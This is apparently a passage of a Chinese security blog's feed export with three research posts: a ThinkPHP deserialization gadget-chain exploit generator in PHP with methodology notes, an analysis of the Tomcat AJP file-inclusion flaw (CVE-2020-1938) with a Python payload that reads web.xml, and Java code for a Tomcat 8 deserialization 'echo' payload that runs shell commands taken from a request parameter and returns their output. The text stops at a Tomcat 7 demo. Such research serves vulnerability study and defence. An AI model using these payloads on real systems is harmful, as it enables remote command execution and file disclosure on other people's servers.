&#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">model</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>();</span><br><span class="line">        <span class="variable">$model</span>-&gt;<span class="title function_ invoke__">setTable</span>(<span class="variable">$model</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$model</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="个人方法论">个人方法论</h2>
<h3 id="反序列化起点">反序列化起点</h3>
<p>起点只有两个</p>
<ul>
<li>__walkup</li>
<li>__destrusct</li>
</ul>
<h3 id="反序列化的中继点">反序列化的中继点</h3>
<ul>
<li>要是某段代码等价于形如<code>$this-&gt;obj1-&gt;method()</code>，中继点可以是obj2的同名method方法，也可以是obj3<code>__call</code>方法</li>
<li>处理字符串的函数(可控$obj)，中继点可以是$obj的<code>__toString</code></li>
<li>某段代码形如<code>$this-&gt;obj[$key]</code>，中继点可以<code>__get</code>或者实现了ArrayAccess的接口。</li>
<li>某段代码里面有new了新对象，那么中继点可以是那个对象的<code>__contrust</code>方法</li>
</ul>
<p>总结一下触发<code>__toString</code>的</p>
<ol>
<li>php内置函数会把传入变量当作字符串处理的时候，例如file_exists()，sprintf</li>
<li>与其它字符串发生运算的时候例如<code>.</code>、<code>==</code></li>
<li>php原生代码里面的异常处理类存在tostring调用点，实际使用时很好用</li>
</ol>
<h3 id="反序列化的终点">反序列化的终点</h3>
<ul>
<li>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用<code>__call_user_func(\$method, $args)</code>，<code>__call_user_func_array([\$obj,\$method], $args)</code>，例如tp5.1</li>
<li>动态调用的方法，$可控方法($可控参数)，例如tp5.2</li>
</ul>
<h3 id="书写exp时候注意事项">书写exp时候注意事项</h3>
<ul>
<li>尽量不进行省略步骤性质的优化，防止出现exp可以但实际环境不成功人为玄学的情况。</li>
<li>对单行执行的不获取返回值的函数进行省略（只要函数内部没有不会抛出异常）。<br>
<img src="./1571231720221.png" alt="Alt text"></li>
<li>触发流程之后的代码都可以省略掉。</li>
</ul>
<p>上面讲的个人心得是脱离框架写exp的思路，maybe直接在框架下的某个路由写exp效率更高。</p>
<h2 id="杂">杂</h2>
<h3 id="受phar影响的函数">受phar影响的函数</h3>
<ul>
<li>fileatime / filectime / filemtime</li>
<li>stat / fileinode / fileowner / filegroup / fileperms</li>
<li>file / file_get_contents / readfile / fopen</li>
<li>file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable /</li>
<li>is_writable</li>
<li>parse_ini_file</li>
<li>unlink</li>
<li>copy</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">挖掘暗藏ThinkPHP中的反序列利用链</a><br>
<a href="https://xz.aliyun.com/t/6467">ThinkPHP5.1.X反序列化利用链</a><br>
<a href="https://xz.aliyun.com/t/6476">ThinkPHP5.2.x反序列化利用链</a><br>
<a href="https://xz.aliyun.com/t/6479">ThinkPHP6.X反序列化利用链</a><br>
<a href="https://www.smi1e.top/n1ctf2019-sql_manage%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/">N1CTF2019 sql_manage出题笔记</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat ajp 漏洞分析</title>
    <url>/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- 漏洞原理本身很简单，值得学习的是tomcat运行的宏观流程，值得思考的是长亭的师傅是怎么挖到的。 -->
<!-- more -->
<h2 id="什么是ajp">什么是ajp</h2>
<p>简单理解成http的二进制优化版。<br>
<img src="1586848883054-0b35011f-8666-4ece-b2ab-91515b6858d2.png#align=left&amp;display=inline&amp;height=320&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=300&amp;originWidth=699&amp;size=65236&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h2 id="tomcat结构">tomcat结构</h2>
<p>在Container部分，一个Host代表一个虚拟主机，一个Context代码一套web程序，一个Wrapper代表一个serlvlet。一个tomcat可以有多个Host，一个Host可以有多个Context，一个Context往往有多个Wrapper。<br>
<img src="1586848550182-49e7237d-f5f0-41ec-8fd0-8d3d2812569e.png#align=left&amp;display=inline&amp;height=564&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=705&amp;originWidth=933&amp;size=197577&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>在Conector部分Endpoint的Acceptor监听连接，Handler用于处理接收到的Socket，在内部调用Processor进行处理。processor把信息读取出来并设置进request中对象最后交给Adaptor，Adapter将请求适配到Servlet容器进行具体的处理。<br>
<img src="1586848576204-d9c37880-c814-47ec-be54-a306d6189fa5.png#align=left&amp;display=inline&amp;height=325&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=457&amp;originWidth=1050&amp;size=78935&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h2 id="环境说明">环境说明</h2>
<p>tomcat 7.0.96</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">  (the &quot;License&quot;); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">metadata-complete</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Welcome to Tomcat<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id=""></h2>
<h2 id="代码流程跟踪">代码流程跟踪</h2>
<p>代码跟踪从handler调用processor的process开始。<br>
<img src="1586853383398-98ae9333-1d19-4dc9-86fa-9b912bc79233.png#align=left&amp;display=inline&amp;height=473&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1758&amp;originWidth=2770&amp;size=598418&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
process里面有两部很重要一个是prepareRequest，另一个是this.adapter.service。<img src="1586863715345-6ad632aa-82f6-421e-a9f3-a2af6b8cb53c.png#align=left&amp;display=inline&amp;height=448&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=896&amp;originWidth=2356&amp;size=258201&amp;status=done&amp;style=none&amp;width=1178" alt="image.png"></p>
<h3 id="prepareRequest">prepareRequest</h3>
<p>先来看prepareRequest。顾名思义，这个函数的作用是把ajp的二进制版的http数据读取（请求方法，请求路径，http头等信息，不每处都截图了）并设置进request对象，然后设置一些对header和cookies长度或数量做一些限制。<br>
<img src="1586864450769-bb69818d-8d74-44e7-ae48-bf781e2d6104.png#align=left&amp;display=inline&amp;height=469&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=938&amp;originWidth=1996&amp;size=261734&amp;status=done&amp;style=none&amp;width=998" alt="image.png"><br>
接下来会读取一个叫attributeCode的东西，payload有意把它设置成了10。这样他会把我们在payload中构造的attributes设置进request对象的attribute，后面任意读文件或者包含祸起就是从这里开始的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_path = <span class="string">&quot;/WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.request_uri&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.path_info&quot;</span>, file_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p><img src="1586864883149-eb93af17-dd1e-4e89-9559-14f8929b7952.png#align=left&amp;display=inline&amp;height=345&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=690&amp;originWidth=2204&amp;size=205872&amp;status=done&amp;style=none&amp;width=1102" alt="image.png"></p>
<h3 id="adapter-service">adapter.service</h3>
<p>在adapter.service中会在postParseRequest中对url进行处理及合法性检查（这里面可能涉及到对url权限校验的问题以后有机会再聊）。如果合法的会进入下面的invoke。<br>
<img src="1586865838743-26dc4c06-7ea3-46d2-9cb9-2f36aedfafe5.png#align=left&amp;display=inline&amp;height=178&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=356&amp;originWidth=2738&amp;size=149846&amp;status=done&amp;style=none&amp;width=1369" alt="image.png"></p>
<p>跟进invoke后会发现是一连串疯狂的invoke，这里取几个有代表性的截图<br>
StandardEngineValve invoke<br>
<img src="1586923179322-45d6b282-158d-4eaf-9dfb-5004711c2893.png#align=left&amp;display=inline&amp;height=342&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1124&amp;originWidth=2454&amp;size=310682&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
StandardHostValve invoke<br>
<img src="1586923274206-c60e2df8-166c-4b35-9f38-82b3551ec6fc.png#align=left&amp;display=inline&amp;height=798&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1596&amp;originWidth=2724&amp;size=515506&amp;status=done&amp;style=none&amp;width=1362" alt="image.png"><br>
StandardContextValve invoke<br>
<img src="1586923319531-6fa17c23-a6aa-41f8-a647-dd67f73ded50.png#align=left&amp;display=inline&amp;height=791&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1582&amp;originWidth=2626&amp;size=464917&amp;status=done&amp;style=none&amp;width=1313" alt="image.png"><br>
最后进入StandardWrapperValve的invoke<br>
wrapper.allocate会返回这次请求对应的servlet，因为我们访问路径是/，所以默认对应index.jsp，所以由jspServlet来处理。<br>
<img src="1586923891934-b3956df4-f6f8-43eb-89a2-2efb12440777.png#align=left&amp;display=inline&amp;height=543&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1676&amp;originWidth=2304&amp;size=460267&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
接下来进入过滤器链<br>
<img src="1586931342555-5573ca98-21b6-41ea-abbb-9356e6503285.png#align=left&amp;display=inline&amp;height=323&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1078&amp;originWidth=2486&amp;size=327697&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
doFilter内部调用internalDoFilter<br>
<img src="1586950100578-c1b80b6c-7907-432f-92e4-94e9922ec789.png#align=left&amp;display=inline&amp;height=658&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1316&amp;originWidth=2532&amp;size=291640&amp;status=done&amp;style=none&amp;width=1266" alt="image.png"><br>
在internalDoFilter中会遍历所有注册过的filter然后进行过滤。遍历完成后会调用对应servlet的services方法。<br>
<img src="1586950744560-48b72337-e4aa-448a-ac97-4fed3e26894e.png#align=left&amp;display=inline&amp;height=221&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=442&amp;originWidth=2248&amp;size=110370&amp;status=done&amp;style=none&amp;width=1124" alt="image.png"><br>
<img src="1586951186394-890844d7-b6a7-466b-804b-ea89313f8f6a.png#align=left&amp;display=inline&amp;height=665&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1330&amp;originWidth=2734&amp;size=376224&amp;status=done&amp;style=none&amp;width=1367" alt="image.png"><br>
这里会把payload中的 javax.servlet.include.request_uri javax.servlet.include.path_info提取并拼接到一起形成jspUri。<br>
<img src="1586960289652-da60cd10-c25c-4414-88e4-9368fc30f9fe.png#align=left&amp;display=inline&amp;height=630&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1260&amp;originWidth=2702&amp;size=334635&amp;status=done&amp;style=none&amp;width=1351" alt="image.png"><br>
这里jspUri会被传入，正常情况下这里传入的是jsp，tomcat会把jsp转为servlet，但是因为我们传入的路径是是非jsp文件不符合语法所以这部分原样输出。因此另一种使用方法也呼之欲出，如果有一个上传洞可以把文件上传到webapp目录下(不管什么后缀）那么我们可以包含这个文件达到rce效果（和php很像）。<br>
<img src="1586960624486-d7fff066-76db-4488-8574-0225b80ab005.png#align=left&amp;display=inline&amp;height=563&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1126&amp;originWidth=1994&amp;size=216493&amp;status=done&amp;style=none&amp;width=997" alt="image.png"><br>
<img src="1586961002526-9f14dac1-fb1f-4c34-8d11-c81d79c5f330.png#align=left&amp;display=inline&amp;height=323&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=646&amp;originWidth=2736&amp;size=192472&amp;status=done&amp;style=none&amp;width=1368" alt="image.png"><br>
<img src="1586961828973-04fb72ff-63d4-4c35-802e-8f9fafd30083.png#align=left&amp;display=inline&amp;height=520&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1040&amp;originWidth=2620&amp;size=348008&amp;status=done&amp;style=none&amp;width=1310" alt="image.png"></p>
<p>补充，只能包含webapp下面的东西。在读取之前会对传入的路径进行格式化，并在格式化后强制加/，无法…/跳出。<br>
<img src="1586962499263-2e94b420-3934-43ba-9b82-2f845a5e7f6f.png#align=left&amp;display=inline&amp;height=383&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=766&amp;originWidth=2320&amp;size=231720&amp;status=done&amp;style=none&amp;width=1160" alt="image.png"></p>
<h2 id="代码流程跟踪图">代码流程跟踪图</h2>
<p><img src="1586849002838-3c230310-b346-46ad-b5e0-e636797563c6.png#align=left&amp;display=inline&amp;height=280&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=354&amp;originWidth=942&amp;size=83164&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h2 id="受影响版本">受影响版本</h2>
<ul>
<li>Apache Tomcat 9.x &lt; 9.0.31</li>
<li>Apache Tomcat 8.x &lt; 8.5.51</li>
<li>Apache Tomcat 7.x &lt; 7.0.100</li>
<li>Apache Tomcat 6.x</li>
</ul>
<h2 id="其他">其他</h2>
<p>文中分析的是最理想的情况实际利用会受到过滤器或是框架的影响关于这部分内容可以看<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/">如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)</a></p>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/7325">Tomcat Ajp协议文件包含漏洞分析</a><br>
<a href="https://xz.aliyun.com/t/7510">tomcat幽灵猫分析</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat不出网回显连续剧第六集</title>
    <url>/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/</url>
    <content><![CDATA[<!-- 离大结局又进了一步 -->
<!-- more -->
<p>首发于<a href="https://xz.aliyun.com/t/7535">先知社区</a></p>
<h2 id="前情提要">前情提要</h2>
<p>这周回顾了一下我看到的前人关于tomcat回显和无文件webshell的文章。发现各个师傅的方法各有优劣，下面简单总结一下（总结不对的地方还请各位师傅指出）。</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a>，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。</li>
<li><a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a>，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。</li>
<li><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a>，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。</li>
<li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">基于Tomcat无文件Webshell研究</a>，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。</li>
</ul>
<p>所以这里提出一种新的回显方案解决一下tomcat7+shiro这个阴暗的角落（经测试tomcat8仍然适用）。<br>
测试环境：macos+tomcat7,8+shiro-simple-web</p>
<h2 id="再看register">再看register</h2>
<p>在上面提到的第四篇文章中提到包含有request（有了request就有response）的rp会被储存在global中，但其实再往下看会发现rp被注册进了组件。<br>
<img src="1585579573873-fde8907a-d8ea-4418-8fb8-4f2f24c5854b.png#align=left&amp;display=inline&amp;height=413&amp;name=image.png&amp;originHeight=826&amp;originWidth=2868&amp;size=245974&amp;status=done&amp;style=none&amp;width=1434" alt="image.png"><br>
既然注册进去了肯定存放在哪里的，接下来动静结合调代码找就好了，代码跟踪过于冗长而且我也没细细探究每一步的意义，就不装模作样的分析了，这里直接给结论。<br>
<img src="1585579952767-ef1b2c0c-0d84-4ec1-953f-89236110b0ab.png#align=left&amp;display=inline&amp;height=645&amp;name=image.png&amp;originHeight=1290&amp;originWidth=2176&amp;size=948160&amp;status=done&amp;style=none&amp;width=1088" alt="image.png"></p>
<p>通过idea的计算功能我们可以符合直觉的拿到response，实际想获取还是需要各种反射的。tomcat7,8获取这条链的方式大同小异，变化之处在于<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio。关于<a href="https://blog.csdn.net/ClementAD/article/details/47045673">bio，nio的细节可以参考这篇文章</a>。</p>
<p>除此之外在实际场景下会有很多requests是要遍历processors中的各个requests。</p>
<h2 id="demo代码">demo代码</h2>
<p>tomcat8的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tomcat82</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">tomcat82</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> Registry.getRegistry((Object)<span class="literal">null</span>, (Object)<span class="literal">null</span>).getMBeanServer();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">&quot;Catalina&quot;</span>)).get(<span class="string">&quot;name=\&quot;http-nio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">obj3</span> <span class="operator">=</span> (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">obj4</span> <span class="operator">=</span> (Request) field.get(obj3.get(i));</span><br><span class="line">                <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> obj4.getParameters().getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="literal">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, username&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>,  username&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    <span class="type">ByteChunk</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteChunk</span>();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>tomcat7的demo</p>
